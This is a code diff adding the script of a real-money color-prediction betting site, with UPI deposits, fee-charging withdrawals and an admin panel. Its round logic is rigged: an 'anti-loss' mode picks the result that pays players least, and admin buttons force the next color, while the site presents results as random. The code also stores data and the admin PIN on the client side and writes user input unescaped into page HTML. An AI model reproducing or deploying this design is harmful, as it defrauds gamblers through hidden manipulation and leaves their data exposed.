+            document.getElementById('authName').classList.toggle('hidden', mode !== 'register');
+            document.getElementById('authPin').classList.toggle('hidden', mode === 'login');
+            
+            if (mode === 'login') {
+                document.getElementById('authTitle').innerText = "USER LOGIN";
+                document.getElementById('authPrimaryBtn').innerText = "Login Now";
+            } else if (mode === 'register') {
+                document.getElementById('authTitle').innerText = "NEW REGISTRATION";
+                document.getElementById('authPrimaryBtn').innerText = "Register Account";
+            } else {
+                document.getElementById('authTitle').innerText = "RESET PASSWORD";
+                document.getElementById('authPrimaryBtn').innerText = "Reset Password";
+            }
+        }
+
+        // BETTING MECHANICS
+        function adjustBet(direction) {
+            let amount = parseInt(document.getElementById('betAmount').value) || 10;
+            amount += direction * stepValue;
+            if (amount < 10) amount = 10;
+            if (amount > 500) amount = 500;
+            document.getElementById('betAmount').value = amount;
+        }
+
+        function setBetStep(val) {
+            stepValue = val;
+            document.getElementById('betAmount').value = val;
+        }
+
+        function selectChoice(choice, type) {
+            if (!currentUser) { alert("Please login first!"); openModal('authModal'); return; }
+            if (timerSeconds <= 10) { alert("Betting locked for last 10 seconds!"); return; }
+
+            const amt = parseInt(document.getElementById('betAmount').value);
+            if (db.users[currentUser].balance < amt) { alert("Insufficient Balance!"); return; }
+
+            db.users[currentUser].balance -= amt;
+            saveDb();
+            updateUserUi();
+
+            selectedChoice = choice;
+            choiceType = type;
+
+            if (type === 'color') colorBets[choice] += amt;
+            else numberBets[choice] += amt;
+
+            document.getElementById('choiceDisplay').innerText = `🎯 Selected: ${choice} (₹${amt})`;
+            logTx('BET_PLACED', amt, `Placed ${type} bet on ${choice}`);
+        }
+
+        function clearSelection() {
+            selectedChoice = null; choiceType = null;
+            document.getElementById('choiceDisplay').innerText = "🎯 Selection: None (Watching Mode)";
+        }
+
+        function evaluateRound() {
+            let winNum = null;
+            if (forcedNextNumber !== null) {
+                winNum = forcedNextNumber;
+                forcedNextNumber = null;
+            } else if (antiLossMode) {
+                let payouts = {};
+                for (let n = 0; n < 10; n++) {
+                    let col = [1,3,7,9].includes(n) ? "Green" : ([2,4,6,8].includes(n) ? "Red" : "Violet");
+                    payouts[n] = (colorBets[col] * 1.9) + (numberBets[n] * 9);
+                }
+                let minPayout = Math.min(...Object.values(payouts));
+                let bestNums = Object.keys(payouts).filter(n => payouts[n] === minPayout);
+                winNum = parseInt(bestNums[Math.floor(Math.random() * bestNums.length)]);
+            } else {
+                winNum = Math.floor(Math.random() * 10);
+            }
+
+            let winColor = [1,3,7,9].includes(winNum) ? "Green" : ([2,4,6,8].includes(winNum) ? "Red" : "Violet");
+            document.getElementById('resultColor').innerText = `🎰 WINNING RESULT: ${winNum} (${winColor})`;
+
+            // Update History
+            history.unshift({ num: winNum, col: winColor });
+            if (history.length > 10) history.pop();
+            renderHistory();
+
+            // Evaluate Bet
+            if (selectedChoice !== null && currentUser) {
+                const amt = parseInt(document.getElementById('betAmount').value);
+                let isWin = false;
+                let payout = 0;
+
+                if (choiceType === 'number' && selectedChoice === winNum) { isWin = true; payout = amt * 9; }
+                if (choiceType === 'color' && selectedChoice === winColor) { isWin = true; payout = Math.round(amt * 1.9); }
+
+                if (isWin) {
+                    db.users[currentUser].balance += payout;
+                    saveDb(); updateUserUi();
+                    document.getElementById('resultStatus').innerText = `🎉 YOU WIN! +₹${payout - amt} Profit`;
+                    logTx('GAME_WIN', payout, `Won bet on ${selectedChoice}`);
+                } else {
+                    document.getElementById('resultStatus').innerText = `💥 YOU LOST! -₹${amt}`;
+                    logTx('GAME_LOSS', amt, `Lost bet on ${selectedChoice}`);
+                }
+            }
+
+            clearSelection();
+            colorBets = { Red: 0, Green: 0, Violet: 0 };
+            numberBets = { 0: 0, 1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0, 8: 0, 9: 0 };
+            if (document.getElementById('adminModal').style.display !== 'none') updateAdminData();
+        }
+
+        function renderHistory() {
+            const colors = { Red: "bg-red-400", Green: "bg-green-400", Violet: "bg-purple-400" };
+            document.getElementById('historyList').innerHTML = history.map(h => 
+                `<span class="${colors[h.col]} text-black font-bold px-2 py-0.5 rounded text-xs">${h.num}</span>`
+            ).join('');
+        }
+
+        // DEPOSIT & WITHDRAWAL GATEWAY
+        function openDepositModal() {
+            if (!currentUser) { alert("Login required!"); return; }
+            setDepositAmount(100);
+            openModal('depositModal');
+        }
+
+        function setDepositAmount(amt) {
+            document.getElementById('depositAmount').value = amt;
+            document.getElementById('qrAmountStatus').innerText = `Scanning Amount: ₹${amt}`;
+            const link = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&am=${amt}&cu=INR`;
+            
+            document.getElementById('qrcode').innerHTML = "";
+            new QRCode(document.getElementById('qrcode'), { text: link, width: 140, height: 140 });
+        }
+
+        function submitDeposit() {
+            const amt = parseInt(document.getElementById('depositAmount').value);
+            const utr = document.getElementById('depositUtr').value.trim();
+
+            if (isNaN(amt) || utr.length !== 12) { alert("Enter valid 12-digit UTR!"); return; }
+
+            db.deposits.push({ id: Date.now(), mobile: currentUser, name: db.users[currentUser].name, amount: amt, utr, status: 'PENDING', date: new Date().toLocaleString() });
+            saveDb();
+            logTx('DEPOSIT_PENDING', amt, `UTR: ${utr}`);
+            alert("Deposit request submitted successfully!");
+            closeModal('depositModal');
+        }
+
+        function openWithdrawModal() {
+            if (!currentUser) { alert("Login required!"); return; }
+            calcFee();
+            openModal('withdrawModal');
+        }
+
+        function calcFee() {
+            const amt = parseInt(document.getElementById('withdrawAmount').value) || 0;
+            const fee = Math.round(amt * 0.09);
+            document.getElementById('feeDisplay').innerText = amt >= 100 ? `Fee (9%): ₹${fee} | You Receive: ₹${amt - fee}` : "Min Withdrawal Amount is ₹100!";
+        }
+
+        async function submitWithdraw() {
+            const amt = parseInt(document.getElementById('withdrawAmount').value);
+            const acc = document.getElementById('withdrawAccount').value.trim();
+            const pwd = document.getElementById('withdrawPassword').value.trim();
+            const method = document.getElementById('withdrawMethod').value;
+
+            if (amt < 100 || db.users[currentUser].balance < amt) { alert("Invalid amount or insufficient balance!"); return; }
+            const pwdHash = await hashString(pwd);
+            if (db.users[currentUser].password !== pwdHash) { alert("Incorrect Password!"); return; }
+
+            const fee = Math.round(amt * 0.09);
+            db.users[currentUser].balance -= amt;
+            db.withdrawals.push({ id: Date.now(), mobile: currentUser, name: db.users[currentUser].name, amount: amt, fee, net: amt - fee, acc, method, status: 'PENDING', date: new Date().toLocaleString() });
+            saveDb(); updateUserUi();
+            logTx('WITHDRAW_REQ', amt, `Pending request to ${acc}`);
+            alert("Withdrawal request submitted!");
+            closeModal('withdrawModal');
+        }
+
+        // ADMIN PANEL LOGIC
+        function promptAdminLogin() {
+            const pin = prompt("ENTER ADMIN PIN:");
+            if (pin === db.adminPin) {
+                updateAdminData();
+                openModal('adminModal');
+            } else { alert("Incorrect Admin PIN!"); }
+        }
+
+        function updateAdminData() {
+            document.getElementById('adminRedBet').innerText = colorBets.Red;
+            document.getElementById('adminGreenBet').innerText = colorBets.Green;
+            document.getElementById('adminVioletBet').innerText = colorBets.Violet;
+            document.getElementById('adminTotalBet').innerText = Object.values(colorBets).reduce((a,b)=>a+b, 0) + Object.values(numberBets).reduce((a,b)=>a+b, 0);
+
+            // Render Deposits Table
+            document.getElementById('adminDepTable').innerHTML = db.deposits.map(d => 
+                `<tr class="border-b border-gray-700"><td>${d.name}</td><td>₹${d.amount}</td><td>${d.utr}</td><td>${d.status}</td>
+                <td>${d.status==='PENDING'?`<button onclick="approveDep(${d.id})" class="text-green-400">Approve</button>`:'Completed'}</td></tr>`
+            ).join('');
+
+            // Render Withdrawals Table
+            document.getElementById('adminWithTable').innerHTML = db.withdrawals.map(w => 
+                `<tr class="border-b border-gray-700"><td>${w.name}</td><td>₹${w.amount}</td><td>₹${w.net}</td><td>${w.acc}</td>
+                <td>${w.status==='PENDING'?`<button onclick="approveWith(${w.id})" class="text-green-400">Approve</button>`:'Completed'}</td></tr>`
+            ).join('');
+
+            // Render Users
+            document.getElementById('adminUserTable').innerHTML = Object.values(db.users).map(u => 
+                `<tr class="border-b border-gray-700"><td>${u.name}</td><td>${u.mobile}</td><td>₹${u.balance}</td>
+                <td><button onclick="resetPin('${u.mobile}')" class="text-amber-400">Reset PIN</button></td></tr>`
+            ).join('');
+        }
+
+        function approveDep(id) {
+            let dep = db.deposits.find(d => d.id === id);
+            if (dep && dep.status === 'PENDING') {
+                dep.status = 'APPROVED';
+                db.users[dep.mobile].balance += dep.amount;
+                saveDb(); updateUserUi(); updateAdminData();
+            }
+        }
+
+        function approveWith(id) {
+            let w = db.withdrawals.find(x => x.id === id);
+            if (w && w.status === 'PENDING') {
+                w.status = 'APPROVED';
+                saveDb(); updateAdminData();
+            }
+        }
+
+        function resetPin(mobile) {
+            const newPin = prompt("Enter new 4-digit PIN for " + mobile);
+            if (newPin && newPin.length === 4) {
+                hashString(newPin).then(h => {
+                    db.users[mobile].pin = h;
+                    saveDb(); alert("PIN updated!");
+                });
+            }
+        }
+
+        function setAntiLoss(val) { antiLossMode = val; document.getElementById('adminStatus').innerText = `Mode: ${val?'Smart Anti-Loss Active':'Random Mode'}`; }
+        function forceColor(col) { forcedNextNumber = col === 'Red' ? 2 : (col === 'Green' ? 1 : 0); alert("Forced " + col); }
+        function changeAdminPin() { const p = prompt("New 4-digit Admin PIN:"); if(p) { db.adminPin = p; saveDb(); } }
+
+        // UTILS
+        function logTx(type, amount, details) {
+            if (currentUser) {
+                db.transactions.push({ mobile: currentUser, type, amount, details, date: new Date().toLocaleString() });
+                saveDb();
+            }
+        }
+
+        function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
+        function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
+        function openLiveChat() { window.open(`https://wa.me/919935088115?text=Hello%20Admin,%20I%20need%20support`, '_blank'); }
+
+        function openHistoryModal() {
+            if (!currentUser) return;
+            const txs = db.transactions.filter(t => t.mobile === currentUser);
+            document.getElementById('historyTableBody').innerHTML = txs.map(t => 
+                `<tr class="border-b border-gray-800"><td>${t.type}</td><td>₹${t.amount}</td><td>${t.details}</td><td>${t.date}</td></tr>`
+            ).join('');
+            openModal('historyModal');
+        }
+
+        function openStatsModal() {
+            if (!currentUser) return;
+            const txs = db.transactions.filter(t => t.mobile === currentUser);
+            document.getElementById('statDeposit').innerText = txs.filter(t => t.type === 'DEPOSIT_SUCCESS').reduce((a,b) => a + b.amount, 0);
+            document.getElementById('statWithdraw').innerText = txs.filter(t => t.type === 'WITHDRAW_REQ').reduce((a,b) => a + b.amount, 0);
+            document.getElementById('statWon').innerText = txs.filter(t => t.type === 'GAME_WIN').reduce((a,b) => a + b.amount, 0);
+            document.getElementById('statLost').innerText = txs.filter(t => t.type === 'GAME_LOSS').reduce((a,b) => a + b.amount, 0);
+            openModal('statsModal');
+        }
+
+        function switchAdminTab(tabId) {
+            ['betsTab', 'depsTab', 'withsTab', 'usersTab'].forEach(t => document.getElementById(t).classList.add('hidden'));
+            document.getElementById(tabId).classList.remove('hidden');
+        }
+    </script>
 </body>
 </html>
